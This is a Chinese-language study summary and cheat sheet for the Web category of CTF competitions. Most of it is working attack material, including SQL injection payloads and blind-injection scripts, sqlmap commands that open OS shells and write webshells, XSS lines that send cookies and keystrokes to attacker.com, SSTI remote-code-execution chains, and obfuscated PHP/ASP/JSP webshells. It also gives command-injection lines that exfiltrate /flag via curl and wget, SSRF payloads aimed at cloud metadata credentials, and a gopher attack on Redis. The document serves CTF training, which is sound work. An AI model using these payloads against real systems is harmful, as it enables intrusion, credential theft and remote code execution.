# Web方向学习总结

### 10.1 解题流程

```
1. 信息收集
   ├── 查看页面源码
   ├── 检查robots.txt
   ├── 目录扫描（dirsearch/gobuster）
   ├── 指纹识别（Wappalyzer/whatweb）
   └── 查看HTTP响应头

2. 漏洞发现
   ├── 参数测试（GET/POST/Cookie/Header）
   ├── 逻辑测试（越权/竞态/业务逻辑）
   └── 自动化扫描（Burp Active Scan）

3. 漏洞利用
   ├── 手动构造Payload
   ├── 使用自动化工具（sqlmap等）
   └── 逐步深入获取Flag

4. 后渗透
   ├── 读取Flag文件
   ├── 提权
   ├── 内网渗透
   └── 持久化（仅攻防模式）
```

### 10.2 工具清单

```
Web CTF必备工具：
├── Burp Suite（抓包、重放、扫描）
├── sqlmap（SQL注入自动化）
├── dirsearch/gobuster（目录扫描）
├── AntSword/蚁剑（Webshell管理）
├── CyberChef（编码解码）
├── Chrome DevTools（前端调试）
├── Postman（API测试）
├── wfuzz（模糊测试）
├── nmap（端口扫描）
└── Python + requests库（自定义脚本）
```

### 10.3 常用Payload速查

```
SQL注入: ' UNION SELECT 1,2,database()-- -
XSS:     <script>alert(document.cookie)</script>
SSRF:    url=http://127.0.0.1/flag
SSTI:    {{7*7}} / ${7*7}
命令注入: ; cat /flag
文件包含: ?file=php://filter/read=convert.base64-encode/resource=flag.php
XXE:     <!ENTITY xxe SYSTEM "file:///flag">
```

---

## 🛠️ 补充：实战拓展 — Web方向CTF常用工具与Payload速查

### 一、Burp Suite 常用功能速查

**1. 常用快捷键**

| 快捷键 | 功能 |
|-------|------|
| `Ctrl+Shift+D` | 发送到Repeater |
| `Ctrl+I` | 发送到Intruder |
| `Ctrl+R` | 发送到Repeater |
| `Ctrl+U` | URL编码选中内容 |
| `Ctrl+Shift+U` | URL解码选中内容 |
| `Ctrl+H` | HTML编码/解码 |
| `Ctrl+B` | Base64编码/解码 |
| `Ctrl+T` | 切换拦截开关 (Proxy tab) |
| `Ctrl+F` | 查找 |
| `Ctrl+G` | 查找下一个 |
| `Ctrl+L` | 转到行 |
| `Ctrl++` / `Ctrl+-` | 字体放大/缩小 |

**2. Repeater 常用操作**

```
Ctrl+R            发送请求
Ctrl+Shift+R     跟随重定向
Ctrl+Shift+H     显示/隐藏请求/响应头部
Ctrl+Shift+B     美化(pretty)显示
Ctrl+Shift+R     原始(raw)显示
Ctrl+Shift+E     渲染(render)显示

右键菜单：
  Send to Intruder     发送到Intruder
  Send to Repeater     发送到新Repeater标签
  Change request method  切换GET/POST
  Copy as curl command  复制为curl命令
  Copy URL             复制URL
  Insert Collaborator payload  插入Burp Collaborator
```

**3. Intruder 攻击类型**

| 类型 | 说明 | 用途 |
|------|------|------|
| Sniper | 单payload逐个替换每个位置 | 单个参数爆破 |
| Battering ram | 同一payload替换所有位置 | 多参数同值 |
| Pitchfork | 每个位置对应各自payload集，同步迭代 | 用户名+密码一一对应 |
| Cluster bomb | 每个位置对应各自payload集，笛卡尔积 | 用户名+密码组合爆破 |

**4. Intruder 常用Payload处理**

```
Payload Processing:
  Add prefix        添加前缀
  Add suffix        添加后缀
  Match/Replace     匹配替换
  Substring         截取子串
  Case modification 大小写转换
  Encode            编码（URL/HTML/Base64等）
  Decode            解码
  Hash              哈希（MD5/SHA1/SHA256等）
  Reverse           反转字符串

Payload Encoding:
  可配置哪些字符需要URL编码
  常见：空格、特殊符号、非ASCII字符
```

**5. Burp Collaborator 使用**

```
# 检测无回显漏洞（SSRF、XXE、RCE等）
1. Burp -> Burp -> Burp Collaborator client
2. 点击 "Copy to clipboard" 复制域名
3. 将域名放入Payload中（如SSRF: http://xxx.oastify.com）
4. 点击 "Poll now" 查看是否收到DNS/HTTP请求

# 常用场景
SSRF:   http://<collab-domain>/
XXE:    <!ENTITY xxe SYSTEM "http://<collab-domain>/xxe">
RCE:    curl http://<collab-domain>/$(id)
SQLi:   LOAD_FILE(CONCAT('\\\\',@@version,'.<collab-domain>\\test'))
```

---

### 二、SQL注入 Payload 速查

**1. 基本注入检测**

```sql
-- 单引号测试
'
"
')
")

-- 布尔盲注检测
' AND 1=1 -- 
' AND 1=2 -- 

-- 时间盲注检测
' AND SLEEP(5) -- 
' AND BENCHMARK(10000000,MD5('test')) -- 
```

**2. UNION 注入**

```sql
-- 确定列数
' ORDER BY 1 -- 
' ORDER BY 2 -- 
' UNION SELECT 1,2,3 -- 

-- 数据库信息（MySQL）
' UNION SELECT 1,version(),database() -- 
' UNION SELECT 1,user(),@@version_compile_os -- 

-- 爆表名
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- 

-- 爆列名
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag_table' -- 

-- 爆数据
' UNION SELECT 1,flag,3 FROM flag_table -- 
```

**3. 报错注入**

```sql
-- MySQL报错注入（updatexml）
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) -- 
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) -- 

-- MySQL报错注入（extractvalue）
' AND extractvalue(1,concat(0x7e,(SELECT version()))) -- 

-- MySQL双注入（count+rand+group by）
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) -- 

-- PostgreSQL报错注入
' AND 1=cast((SELECT version()) as int) -- 
```

**4. 盲注脚本模板（Python）**

```python
import requests

url = "http://target.com/index.php"

# 布尔盲注：逐字符猜解
def boolean_blind():
    result = ""
    for pos in range(1, 50):
        low, high = 32, 127
        while low <= high:
            mid = (low + high) // 2
            # SQL: SELECT ascii(substr(database(), pos, 1)) > mid
            payload = f"' AND ascii(substr(database(),{pos},1))>{mid} -- "
            r = requests.get(url, params={"id": f"1{payload}"})
            if "正常页面特征" in r.text:
                low = mid + 1
            else:
                high = mid - 1
        if low == 31:
            break
        result += chr(low)
        print(f"[+] {result}")
    return result

# 时间盲注：逐字符猜解
import time

def time_blind():
    result = ""
    for pos in range(1, 50):
        low, high = 32, 127
        while low <= high:
            mid = (low + high) // 2
            payload = f"' AND IF(ascii(substr(database(),{pos},1))>{mid},SLEEP(2),0) -- "
            start = time.time()
            r = requests.get(url, params={"id": f"1{payload}"}, timeout=10)
            elapsed = time.time() - start
            if elapsed > 2:
                low = mid + 1
            else:
                high = mid - 1
        if low == 31:
            break
        result += chr(low)
        print(f"[+] {result}")
    return result
```

**5. 绕过过滤**

```sql
-- 绕过空格
/**/代替空格
'/**/AND/**/1=1/**/-- 
%09 TAB
%0a 换行
%0d 回车
%0c 换页
%a0 非断空格

-- 绕过引号
使用十六进制代替字符串
WHERE table_name=0x666c6167   -- flag的十六进制
CHAR(102)+CHAR(108)+CHAR(97)+CHAR(103) -- flag

-- 绕过and/or
&& 代替 AND
|| 代替 OR

-- 绕过union+select
UNI/**/ON SEL/**/ECT
UNION%0d%0aSELECT
union all select

-- 绕过逗号
select * from (select 1)a join (select 2)b join (select 3)c
substr(str from pos for len)   -- 用from for代替逗号
```

**6. sqlmap 常用命令**

```bash
# 基本扫描
sqlmap -u "http://target.com/page?id=1"
sqlmap -r request.txt           # 从Burp保存的请求文件

# 指定参数
sqlmap -u "http://target.com/page?id=1" -p id
sqlmap -u "http://target.com/page" --data "id=1"

# POST数据
sqlmap -u "http://target.com/login" --data "user=admin&pass=123"

# Cookie注入
sqlmap -u "http://target.com/page" --cookie "id=1"

# User-Agent注入
sqlmap -u "http://target.com/page" --user-agent "*"

# 级别和风险
sqlmap -u "URL" --level=3 --risk=2
# level: 1-5 (测试payload数量，默认1)
# risk:  1-3 (风险级别，默认1，3可能导致数据丢失)

# 获取信息
sqlmap -u "URL" --dbs          # 所有数据库
sqlmap -u "URL" -D dbname --tables  # 指定库的表
sqlmap -u "URL" -D dbname -T tablename --columns  # 指定表的列
sqlmap -u "URL" -D dbname -T tablename --dump     # 导出数据

# 快速获取
sqlmap -u "URL" --current-db    # 当前数据库
sqlmap -u "URL" --current-user  # 当前用户
sqlmap -u "URL" --is-dba        # 是否是DBA
sqlmap -u "URL" --hostname      # 主机名

# 提权/执行命令（DBA权限时）
sqlmap -u "URL" --os-shell      # 获取系统Shell
sqlmap -u "URL" --sql-shell     # 获取SQL Shell
sqlmap -u "URL" --os-cmd="whoami"  # 执行命令

# 读取/写入文件
sqlmap -u "URL" --file-read "/etc/passwd"
sqlmap -u "URL" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# 绕过WAF
sqlmap -u "URL" --tamper=space2comment  # 空格替换为注释
sqlmap -u "URL" --tamper=base64encode   # Base64编码
sqlmap -u "URL" --tamper=charencode     # URL编码
sqlmap -u "URL" --tamper=apostrophemask # 引号转UTF-8
# 多个tamper一起用
sqlmap -u "URL" --tamper="space2comment,charencode"

# 列出所有tamper脚本
sqlmap --list-tampers

# 随机Agent + 延迟
sqlmap -u "URL" --random-agent --delay=1
```

---

### 三、XSS Payload 速查

**1. 基础Payload**

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
```

**2. 绕过过滤**

```html
<!-- 大小写绕过 -->
<sCrIpT>alert(1)</sCrIpT>

<!-- 不使用script标签 -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

<!-- 不使用括号 -->
<img src=x onerror='alert`1`'>
<svg onload=alert&#40;1&#41;>

<!-- 不使用引号 -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert&#40;1&#41;>

<!-- 编码绕过 -->
<img src=x onerror="&#97;lert(1)">
<svg onload="\x61lert(1)">
<a href="javascript:%61lert(1)">click</a>

<!-- 事件注入 -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onclick='alert(1)

<!-- 协议绕过 -->
javascript:alert(1)
JaVaScRiPt:alert(1)
java&#115;cript:alert(1)
data:text/html,<script>alert(1)</script>
```

**3. 获取Cookie / 钓鱼**

```html
<!-- 获取Cookie（外带到自己的服务器） -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="this.src='http://attacker.com/steal?c='+document.cookie">
<script>new Image().src='http://attacker.com/'+document.cookie</script>

<!-- 页面跳转钓鱼 -->
<script>location.href='http://fake-login.com'</script>
<meta http-equiv="refresh" content="0;url=http://fake-login.com">

<!-- 键盘记录 -->
<script>
document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/key?k=' + String.fromCharCode(e.keyCode);
}
</script>

<!-- BeEF Hook -->
<script src="http://attacker.com:3000/hook.js"></script>
```

**4. DOM XSS 常见sink**

```javascript
// 危险函数/属性（sink）
document.write()
document.writeln()
document.innerHTML
document.outerHTML
eval()
setTimeout()
setInterval()
Function()
window.location
document.location
location.href
document.domain

// 常见源（source）
location.href
location.search
location.hash
document.referrer
document.cookie
window.name
postMessage
localStorage
sessionStorage
```

---

### 四、SSTI Payload 速查

**1. Jinja2 / Twig (Python/PHP)**

```python
# 基本探测
{{7*7}}           # 返回49
{{7*'7'}}         # Jinja2返回7777777，Twig返回49

# 读取配置
{{config}}
{{config.items()}}
{{config['SECRET_KEY']}}

# 获取类
''.__class__
''.__class__.__mro__[1].__subclasses__()
''.__class__.__bases__[0].__subclasses__()

# 读取文件（通过get_flashed_messages或os）
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# RCE（找到 subprocess.Popen 或 warnings.warn 等）
{{ ''.__class__.__mro__[1].__subclasses__().index('subprocess.Popen') }}
# 找到索引后：
{{ ''.__class__.__mro__[1].__subclasses__()[<index>]('id', shell=True, stdout=-1).communicate()[0] }}

# 常用RCE payload (Jinja2)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# 过滤绕过
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['os']['popen']('id')['read']() }}
{{ config|attr("__class__")|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")() }}
```

**2. Flask/Jinja2 SSTI 进阶**

```python
# 读取app配置
{{ config }}
{{ config.SECRET_KEY }}

# 通过url_for
{{ url_for.__globals__['current_app'].config }}
{{ url_for.__globals__['__builtins__']['__import__']('os').popen('id').read() }}

# 通过get_flashed_messages
{{ get_flashed_messages.__globals__['current_app'].config }}
```

**3. PHP SSTI (Twig / Smarty)**

```php
{# Twig #}
{{7*7}}
{{_self}}
{{_env}}
{{app}}

# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['id']|map('system')}}
{{['id']|reduce('system')}}
{{['cat /etc/passwd']|filter('passthru')}}

{# Smarty #}
{php}echo `id`;{/php}
{literal}{/literal}
{$smarty.version}
```

---

### 五、文件上传绕过速查

**1. 常见绕过方式**

```
1. 后缀名绕过
   - 双后缀: shell.php.jpg
   - 点空格: shell.php.  (Windows自动去掉末尾的点)
   - 大小写: shell.pHp
   - 特殊后缀: shell.php5 / shell.phtml / shell.php3
   - 特殊字符: shell.php%00.jpg (00截断，老版本PHP)

2. MIME类型绕过
   - 修改Content-Type: image/jpeg
   - 修改Content-Type: image/png
   - 修改Content-Type: image/gif

3. 文件头绕过
   - 文件头添加: GIF89a
   - 文件头添加: \xFF\xD8\xFF (JPEG头)
   - 文件头添加: \x89PNG (PNG头)

4. .htaccess 绕过
   上传.htaccess文件内容:
   AddType application/x-httpd-php .jpg
   然后上传.jpg的webshell

5. 解析漏洞
   - Apache: shell.php.jpg (部分配置下按php解析)
   - Nginx: /shell.jpg%00.php 或 /shell.jpg/shell.php
   - IIS 6.0: 目录名.asp/1.jpg 或 文件名.asp;1.jpg

6. 竞争条件
   - 上传后立即访问（在删除之前执行）
   - 配合条件竞争脚本
```

**2. 常见 WebShell**

```php
// PHP 一句话
<?php eval($_POST['cmd']); ?>
<?php assert($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>

// PHP 免杀变形
<?php
$a = strrev('lave');
$a($_POST['x']);
?>

<?php
$_=base64_decode('ZXZhbA==');
$_($_POST['x']);
?>

// JPG+PHP 图片马
// 文件头是图片，内容包含PHP代码
// copy normal.jpg/b + shell.php/a shell.jpg

// ASP一句话
<%eval request("cmd")%>
<%execute request("cmd")%>

// JSP一句话
<%
    if(request.getParameter("cmd")!=null){
        Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
%>
```

**3. Python 脚本：文件上传 + 竞争条件**

```python
import requests
import threading
import time

url_upload = "http://target.com/upload.php"
url_shell = "http://target.com/upload/shell.php"
shell_content = b"<?php system($_GET['cmd']); ?>"
files = {"file": ("shell.php", shell_content, "image/jpeg")}

def upload():
    while True:
        try:
            r = requests.post(url_upload, files=files, timeout=5)
        except:
            pass

def access():
    count = 0
    while True:
        try:
            r = requests.get(url_shell + "?cmd=id", timeout=3)
            if "uid=" in r.text:
                print(f"[+] Got shell! Attempt {count}")
                print(r.text)
                return
            count += 1
            if count % 100 == 0:
                print(f"[-] Attempt {count}")
        except:
            pass

# 启动多线程
for i in range(5):
    threading.Thread(target=upload).start()
for i in range(10):
    threading.Thread(target=access).start()
```

---

### 六、命令注入 Payload 速查

**1. 基本分隔符**

```
; cmd          分号分隔
| cmd          管道符
|| cmd         或（前面失败才执行后面）
&& cmd         与（前面成功才执行后面）
& cmd          后台执行
\n cmd         换行
$()            命令替换
``             命令替换（反引号）
```

**2. 常用 Payload**

```bash
# 读取文件
; cat /flag
; cat /etc/passwd
| cat /flag
id; cat /flag

# 命令替换
$(id)
`id`
$(cat /flag)

# 绕过空格
;cat${IFS}/flag
;cat$IFS$9/flag
;{cat,/flag}
;cat</flag
;cat<</flag

# 绕过关键字
# 拼接
; a=ca; b=t/flag; $a$b
; c=fla;d=g; cat /$c$d

# 通配符
; cat /fla?
; cat /fl*
; cat /???/passwd

# base64编码绕过
; echo Y2F0IC9mbGFn | base64 -d | bash
; `echo Y2F0IC9mbGFn | base64 -d`

# 十六进制
; printf '\x63\x61\x74\x20\x2f\x66\x6c\x61\x67' | bash

# 八进制
; $(printf '\143\141\164\40\57\146\154\141\147')

# 反向绕过
; echo galf/ tac | rev | bash
; $(rev<<<'galf/ tac'|bash)
```

**3. 无回显命令注入（带外传输）**

```bash
# DNS带外（需要有DNS服务器）
; ping $(whoami).attacker.com
; nslookup $(id).attacker.com
; host $(cat /flag).attacker.com

# HTTP带外
; curl http://attacker.com/$(cat /flag | base64 -w0)
; wget http://attacker.com/$(id) -O /dev/null
; curl -X POST -d "flag=$(cat /flag)" http://attacker.com

# 写入Webshell
; echo '<?php eval($_POST[1]);?>' > /var/www/html/shell.php
; echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ | base64 -d > /var/www/html/shell.php
```

---

### 七、SSRF Payload 速查

**1. 内网探测**

```
# 本地文件
file:///etc/passwd
file:///flag
php://filter/read=convert.base64-encode/resource=index.php

# 本地端口探测
http://127.0.0.1:80/
http://127.0.0.1:22/
http://127.0.0.1:6379/      # Redis
http://127.0.0.1:3306/      # MySQL
http://127.0.0.1:8080/      # 常见内部服务

# 内网网段
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/
http://[::1]/               # IPv6本地

# 云服务元数据
http://169.254.169.254/latest/meta-data/           # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://100.100.100.200/latest/meta-data/            # 阿里云
http://metadata.tencentyun.com/latest/meta-data/    # 腾讯云
```

**2. 绕过过滤**

```
# IP地址变形
http://2130706433/           # 127.0.0.1的十进制
http://0x7f000001/           # 十六进制
http://0177.0.0.1/           # 八进制
http://127.1/                # 简写
http://0/                    # 0.0.0.0

# DNS重绑定
# 使用同时指向127.0.0.1和公网IP的域名
# attacker.com -> 先返回公网IP通过校验，再返回127.0.0.1

# 302跳转
http://attacker.com/redirect.php?url=file:///flag

# 协议绕过
dict://127.0.0.1:6379/info   # dict协议（Redis等）
gopher://127.0.0.1:6379/_... # gopher协议（构造任意TCP包）
ftp://user:pass@host/        # FTP协议
http://@127.0.0.1            # @符号绕过

# URL编码
http://127%2e0%2e0%2e1/
http://127%2E0%2E0%2E1/
http://127%u002e0%u002e0%u002e1  # Unicode编码
```

**3. Gopher 协议构造**

```bash
# Gopher协议格式:
# gopher://host:port/_<TCP数据包内容>
# 注意：换行需要URL编码为 %0d%0a

# 攻击Redis（写入webshell）
gopher://127.0.0.1:6379/_
config set dir /var/www/html%0d%0a
config set dbfilename shell.php%0d%0a
set x "<?php phpinfo();?>%0d%0a
save%0d%0a
quit%0d%0a

# 攻击FastCGI
# 构造FastCGI协议包执行PHP代码

# 攻击MySQL
# 构造MySQL认证和查询包
```

---

### 八、反序列化漏洞速查

**1. PHP 反序列化**

```php
// PHP序列化格式
O:4:"Test":2:{s:4:"name";s:5:"admin";s:3:"age";i:20;}
a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}

// 常见魔法方法
__wakeup()      // 反序列化时自动调用
__destruct()    // 对象销毁时调用
__toString()    // 对象被当作字符串时
__get()         // 读取不可访问属性时
__set()         // 设置不可访问属性时
__call()        // 调用不可访问方法时
__invoke()      // 以函数方式调用对象时

// PHP反序列化RCE利用链
// 常见: PHPGGC (PHP Generic Gadget Chains)
// 工具: phpggc

// 生成Payload
// phpggc -l                    列出所有链
// phpggc Laravel/RCE1 system id  生成Laravel RCE链
// phpggc -f WordPress/RCE2 -b "id"  WordPress链

// __wakeup绕过（CVE-2016-7124）
// 将对象属性数改大，绕过__wakeup
O:4:"Test":10:{s:4:"name";s:5:"admin";}  // 把2改成10

// 引用绕过
// 利用引用指向已有的对象属性
```

**2. Python 反序列化 (pickle)**

```python
# pickle 反序列化漏洞
# __reduce__ 方法在反序列化时被调用，类似RCE

# 生成恶意pickle
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# 发送给反序列化点

# Python 2/3 兼容
# Python 2: cPickle, pickle
# Python 3: pickle, _pickle

# yaml 反序列化
import yaml
# 危险: yaml.load() (PyYAML < 5.1)
# 安全: yaml.safe_load()
# 利用链: !!python/object/apply:os.system ["id"]
```

**3. Java 反序列化**

```
# 常见利用链
CommonsCollections1-7
CommonsBeanutils1
Jdk7u21 / Jdk8u20
Groovy1
Spring1 / Spring2
Hibernate1
JBoss Interceptors1

# 工具: ysoserial
java -jar ysoserial.jar CommonsCollections1 "id" > payload.ser
java -jar ysoserial.jar CommonsCollections2 "id" > payload.ser
java -jar ysoserial.jar JRMPClient 10.0.0.1:1099 > payload.ser

# 常见检测点
- Base64编码的二进制数据（rO0开头）
- Cookie / Session 中的序列化数据
- 表单提交的对象数据
- AMF / RMI / JMX 协议

# 识别特征
- Base64解码后以 ac ed 00 05 开头（Java序列化魔数）
- rO0AB... （Base64后的Java序列化数据）
```

---

## 📋 内容审核与补充建议

> 针对「Web方向学习总结」部分的内容审核结果：

### 📚 知识点补充
- ⚠️ 缺少knowledge相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
